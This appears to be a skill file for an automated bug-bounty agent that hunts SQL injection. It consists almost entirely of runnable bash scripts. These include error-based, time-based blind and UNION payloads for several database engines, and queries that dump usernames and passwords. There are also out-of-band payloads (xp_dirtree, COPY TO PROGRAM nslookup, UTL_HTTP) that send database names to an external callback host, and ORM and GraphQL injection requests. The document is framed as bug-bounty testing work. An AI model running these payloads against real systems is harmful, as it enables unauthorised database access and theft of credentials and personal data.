---
name: k1nzr3c0n-hunt-sqli
description: "SQL Injection hunting skill built from 12 disclosed bug bounty reports. Covers error-based, blind time-based, UNION-based, OOB (DNS/HTTP), NoSQL variant, GraphQL injection, ORM raw fragment (Django JSONField CVE-2024-42005, Sequelize, Salesforce SOQL). Statistical-sample rule enforced for timing."
tags: [sqli, sql-injection, hunt, web-security, bug-bounty]
report_count: 12
---

# K1NZR3C0N Hunt — SQL Injection

> **Statistical-Sample Rule**: timing-based SQLi needs n≥10 trials, mean ≥2σ above baseline. Single slow response = jitter.
> **Exfil-Or-Downgrade**: error message alone → Informational. Must exfil actual rows for High/Critical.

---

## Crown Jewels

```
Priority 1 — Auth bypass (login with ' OR 1=1--)
Priority 2 — Dump credentials/PII table via UNION or blind
Priority 3 — OOB data exfil via DNS (xp_cmdshell, load_file, UTL_HTTP)
Priority 4 — ORM raw fragment injection (GraphQL, Django, Sequelize)
Priority 5 — Second-order SQLi (stored payload executed later)
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_sqli_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"
echo "[+] Target: $TARGET | OOB: $OOB"

# Pull SQLi candidates from k1nzr3c0n outputs
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+[?&](?:id|sort|order|filter|category|search|q|page|limit|offset|start|end|name|email|user|type|status|by|from|to|date|year|month|key|val|value|field|col|table|where|query|group)=[^\s&"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/sqli_candidates.txt" | wc -l \
  | xargs echo "SQLi candidates:"
```

## Phase 1 — Error-Based Detection

```bash
echo "=== Error-Based SQLi Detection ==="
# Inject single quote and look for DB error messages
for EP in $(head -30 "$HUNT/sqli_candidates.txt"); do
  RESP=$(curl -sk "${EP}'" 2>/dev/null)
  echo "$RESP" | grep -iqE \
    "sql syntax|mysql_fetch|ORA-[0-9]+|PostgreSQL.*ERROR|sqlite.*error|ODBC Driver|JDBC|syntax error.*near|unclosed quotation|invalid column|Division by zero|You have an error in your SQL" \
    && echo "  [ERROR-BASED] $EP"
done

# Double quote variant
for EP in $(head -30 "$HUNT/sqli_candidates.txt"); do
  RESP=$(curl -sk "${EP}\"" 2>/dev/null)
  echo "$RESP" | grep -iqE "sql|syntax|database|error|mysql|oracle|postgres|sqlite" \
    && echo "  [ERROR-DBL] $EP"
done
```

## Phase 2 — Time-Based Blind (Statistical)

```bash
echo "=== Time-Based Blind SQLi (n=10 statistical test) ==="
ENDPOINT="${SQLI_ENDPOINT:-}"
PARAM="${SQLI_PARAM:-id}"

if [ -z "$ENDPOINT" ]; then echo "Set SQLI_ENDPOINT first"; fi

# Baseline: 10 normal requests
echo "Collecting baseline timing (10 requests)..."
BASELINE_TIMES=()
for I in $(seq 1 10); do
  T=$(curl -sk -o /dev/null -w '%{time_total}' "${ENDPOINT}1")
  BASELINE_TIMES+=("$T")
  echo -n "."
done
echo ""

# MySQL sleep payload
PAYLOADS=(
  "1 AND SLEEP(5)--"
  "1' AND SLEEP(5)--"
  "1) AND SLEEP(5)--"
  "1' AND SLEEP(5)#"
  # PostgreSQL
  "1; SELECT pg_sleep(5)--"
  "1' ; SELECT pg_sleep(5)--"
  # MSSQL
  "1; WAITFOR DELAY '0:0:5'--"
  # Oracle
  "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
)

for P in "${PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
  T=$(curl -sk -o /dev/null -w '%{time_total}' "${ENDPOINT}${ENCODED}")
  echo "  [${T}s] ${P:0:50}"
  # Only flag if clearly >= 4s (expect 5s delay)
  python3 -c "import sys; t=float('$T'); sys.exit(0 if t>=4 else 1)" && \
    echo "    *** TIMING HIT — run 10 more trials to confirm ***"
done
```

## Phase 3 — UNION-Based Extraction

```bash
echo "=== UNION-Based Extraction ==="
ENDPOINT="${SQLI_ENDPOINT:-}"

# Step 1: Find column count
for N in $(seq 1 10); do
  COLS=$(python3 -c "print(','.join(['NULL']*$N))")
  RESP=$(curl -sk "${ENDPOINT}1 ORDER BY ${N}--")
  echo "$RESP" | grep -iq 'error\|unknown column\|1222\|ORA-' && \
    { echo "  [COLS] Column count = $((N-1))"; break; }
done

# Step 2: Find string column
RESP=$(curl -sk "${ENDPOINT}0 UNION SELECT 'sqlitest',NULL,NULL,NULL--")
echo "$RESP" | grep -q 'sqlitest' && echo "  [COL1] First column outputs string"

# Step 3: Extract data
for QUERY in \
  "0 UNION SELECT user(),version(),database(),NULL--" \
  "0 UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--" \
  "0 UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'--" \
  "0 UNION SELECT username,password,NULL,NULL FROM users--"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$QUERY")
  RESP=$(curl -sk "${ENDPOINT}${ENCODED}")
  echo "  QUERY: ${QUERY:0:60}"
  echo "  RESP : ${RESP:0:200}"
  echo ""
done
```

## Phase 4 — OOB Data Exfiltration

```bash
echo "=== OOB SQLi (DNS exfil) ==="
PROBE_ID=$(openssl rand -hex 4)

# MySQL: LOAD_FILE + UNC path (Windows MSSQL)
OOB_PAYLOADS=(
  # MySQL
  "1 AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.','"${PROBE_ID}".','"${OOB}"','\\\\a'))"
  # MSSQL xp_dirtree
  "1; EXEC xp_dirtree '\\\\${PROBE_ID}.${OOB}\\a'--"
  # PostgreSQL COPY
  "1; COPY (SELECT '') TO PROGRAM 'nslookup ${PROBE_ID}.${OOB}'--"
  # Oracle UTL_HTTP
  "1 AND UTL_HTTP.REQUEST('http://${PROBE_ID}.${OOB}/')=1--"
)

for P in "${OOB_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
  echo "  Sending: ${P:0:60}..."
  curl -sk -o /dev/null -m 10 "${SQLI_ENDPOINT:-}${ENCODED}"
done
echo "  [!] Check OOB listener: $PROBE_ID.$OOB"
```

## Phase 5 — ORM / GraphQL Injection

```bash
echo "=== ORM / GraphQL SQLi ==="

# Django JSONField (CVE-2024-42005)
# Unsafe: Model.objects.filter(**user_input)
# Test: inject __raw in parameter names
curl -sk "https://${TARGET}/api/users/?id__raw=1 OR 1=1" | python3 -m json.tool 2>/dev/null | head -10

# Sequelize raw fragment
curl -sk "https://${TARGET}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"where": "1=1 --"}' | head -5

# GraphQL injection in arguments
GQL_EP="https://${TARGET}/graphql"
for PAYLOAD in "1' OR '1'='1" "1 UNION SELECT 1--" "' OR SLEEP(5)--"; do
  curl -sk "$GQL_EP" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ users(id: \\\"${PAYLOAD}\\\") { id email } }\"}" \
    | grep -iE 'sql|syntax|error|mysql' && echo "  [GQL-SQLI] $PAYLOAD"
done
```

## Phase 6 — Gate 0

```bash
echo "=== SQLi Gate 0 ==="
echo "  □ Error shows actual DB engine (MySQL/Postgres/Oracle)"
echo "  □ Timing: n≥10 trials confirming ≥4s delay consistently"
echo "  □ UNION: actual data rows extracted (not just columns)"
echo "  □ OOB: DNS/HTTP callback received with data in subdomain"
echo "  □ Impact: user credentials / PII / financial data extracted"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

---
## Report Formula
```
SQLi [error-based/blind/UNION] in [endpoint?param=] allows database enumeration and [user table] extraction
Time-Based Blind SQL Injection in [parameter] on [endpoint] — confirmed with n=10 statistical test (mean Xs vs Ys baseline)
```
